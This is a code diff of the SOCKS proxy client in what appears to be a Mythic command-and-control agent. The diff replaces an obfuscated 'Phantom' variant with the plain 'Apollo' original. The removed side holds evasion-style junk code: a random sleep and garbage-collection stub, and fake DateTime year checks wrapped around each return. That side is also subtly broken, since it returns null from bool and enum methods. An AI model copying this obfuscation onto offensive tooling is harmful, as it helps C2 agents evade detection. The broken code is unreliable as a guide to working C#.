@@ -1,5 +1,5 @@
-﻿using PhantomInterop.Classes;
-using PhantomInterop.Interfaces;
+﻿using ApolloInterop.Classes;
+using ApolloInterop.Interfaces;
 using System;
 using System.Collections.Concurrent;
 using System.Linq;
@@ -7,20 +7,15 @@ using System.Net.Sockets;
 using System.Text;
 using System.Threading;
 using TT = System.Threading.Tasks;
-using PhantomInterop.Enums.PhantomEnums;
-using PhantomInterop.Structs.MythicStructs;
+using ApolloInterop.Enums.ApolloEnums;
+using ApolloInterop.Structs.MythicStructs;
 using System.Net;
-using PhantomInterop.Constants;
+using ApolloInterop.Constants;
 
-namespace Phantom.Management.Socks
+namespace Apollo.Management.Socks
 {
     public class SocksClient
     {
-    private static void Zc3d4e5()
-    {
-        Thread.Sleep(Random.Next(1, 5));
-        GC.Collect();
-    }
 
         private AsyncTcpClient _client;
         private IPAddress _addr;
@@ -106,7 +101,7 @@ namespace Phantom.Management.Socks
                 try
                 {
                     client.GetStream().EndWrite(result);
-                    
+                    // Potentially delete this since theoretically the sender Task does everything
                     if (_requestQueue.TryDequeue(out byte[] data))
                     {
                         client.GetStream().BeginWrite(data, 0, data.Length, OnDataSent, client);
@@ -132,7 +127,7 @@ namespace Phantom.Management.Socks
 
         public static Socks5AddressType GetAddrType(byte[] data)
         {
-            if(DateTime.Now.Year > 2020) { return (Socks5AddressType)data[3]; } else { return null; }
+            return (Socks5AddressType)data[3];
         }
 
         public bool GetConnection(byte[] data)
@@ -150,8 +145,8 @@ namespace Phantom.Management.Socks
                         _addr = Dns.GetHostEntry(domainName).AddressList[0];
                     } catch (Exception ex)
                     {
-                        
-                        if(DateTime.Now.Year > 2020) { return false; } else { return null; }
+                        // Console.WriteLine($"Failed to resolve DNS for {domainName}: {ex.Message}");
+                        return false;
                     }
                     _client = new AsyncTcpClient(domainName, _port);
                     break;
@@ -172,23 +167,23 @@ namespace Phantom.Management.Socks
             }
             if (_client == null)
             {
-                if(DateTime.Now.Year > 2020) { return false; } else { return null; }
+                return false;
             }
             _client.ConnectionEstablished += OnConnect;
             _client.Disconnect += OnDisconnect;
             _client.MessageReceived += OnMessageReceived;
 
-            if(DateTime.Now.Year > 2020) { return _client.Connect(); } else { return null; }
+            return _client.Connect();
         }
 
         private bool SupportedSocksVersion(byte[] data)
         {
-            if(DateTime.Now.Year > 2020) { return data[0] == SOCKS.SUPPORTED_VERSION; } else { return null; }
+            return data[0] == SOCKS.SUPPORTED_VERSION;
         }
 
         private Socks5Command GetCommand(byte[] data)
         {
-            if(DateTime.Now.Year > 2020) { return (Socks5Command)data[1]; } else { return null; }
+            return (Socks5Command)data[1];
         }
 
         public bool HandleDatagram(SocksDatagram dg)
@@ -200,8 +195,8 @@ namespace Phantom.Management.Socks
                 data = Convert.FromBase64String(dg.Data);
             } catch (Exception ex)
             {
-                
-                if(DateTime.Now.Year > 2020) { return bRet; } else { return null; }
+                // Console.WriteLine($"Invalid b64 data from Mythic: {ex.Message}");
+                return bRet;
             }
 
             if (_client != null && !_sendRequestsTask.IsCompleted)
@@ -292,7 +287,7 @@ namespace Phantom.Management.Socks
                     }
                 }
             }
-            if(DateTime.Now.Year > 2020) { return bRet; } else { return null; }
+            return bRet;
         }
     }
 }
